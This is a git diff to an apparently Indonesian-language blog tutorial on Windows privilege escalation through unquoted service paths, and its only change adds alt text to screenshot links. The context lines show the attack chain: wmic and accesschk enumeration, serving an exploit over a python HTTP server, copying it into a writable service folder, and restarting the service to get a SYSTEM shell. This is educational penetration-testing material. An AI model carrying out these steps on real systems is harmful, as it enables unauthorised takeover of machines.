@@ -28,7 +28,7 @@ Pada tahap awal, tentunya kita perlu melakukan enumerasi terlebih dahulu untuk m
 wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
 ```
 
-![](../../assets/img/20240303-unquoted-service-path-windows-pe-wmic-enum.png)
+![wmic service get](../../assets/img/20240303-unquoted-service-path-windows-pe-wmic-enum.png)
 
 Dari hasil enumerasi (menggunakan `wmic`), kita mendapatkan 2 buah Path yang tidak mengandung kutip.
 
@@ -41,7 +41,7 @@ Setelah itu kita periksa, apakah kita (sebagai User biasa) dapat menuliskan file
 .\accesschk.exe /accepteula -uwdq "C:\<path name>\"
 ```
 
-![](../../assets/img/20240303-unquoted-service-path-windows-pe-accesschk-enum.png)
+![accesschk.exe](../../assets/img/20240303-unquoted-service-path-windows-pe-accesschk-enum.png)
 
 Nah! Di sini kita sudah menemukan bahwa folder **C:\\Program Files\\Unquoted Path Service** bisa kita tulis, karena terdapat Attribute `RW BUILTIN\Users`.
 
@@ -81,7 +81,7 @@ python3 -m http.server 8000
 
 # Abuse the Service
 
-![](../../assets/img/20240303-unquoted-service-path-windows-pe-download-exploit.exe.png)
+![exploit.exe](../../assets/img/20240303-unquoted-service-path-windows-pe-download-exploit.exe.png)
 
 Jika file exploit-nya sudah kita download, lalu kita pindahkan file tersebut ke dalam Service Path yang rentan. Namun, nama file perlu disesuaikan dengan nama Folder yang akan dipanggil (berdasarkan urutannya).
 
@@ -98,7 +98,7 @@ Maka, eksploitasinya harus:
 copy "C:\Users\<exploit file>" "C:\Program Files\<path name>\<first path name>.exe"
 ```
 
-![](../../assets/img/20240303-unquoted-service-path-windows-pe-copy-exploit-file.png)
+![Copy exploit.exe](../../assets/img/20240303-unquoted-service-path-windows-pe-copy-exploit-file.png)
 
 Jika sudah maka kita langsung jalankan saja Service-nya.
 
@@ -107,8 +107,8 @@ sc stop "<service name>"
 sc start "<service name>"
 ```
 
-![](../../assets/img/20240303-unquoted-service-path-windows-pe-sc-start-service.png)
+![Service Start](../../assets/img/20240303-unquoted-service-path-windows-pe-sc-start-service.png)
 
 Jika berhasil, kita akan mendapatkan akses shell-nya sebagai `NT AUTHORITY\SYSTEM`.
 
-![](../../assets/img/20240303-unquoted-service-path-windows-pe-result.png)
+![Result](../../assets/img/20240303-unquoted-service-path-windows-pe-result.png)
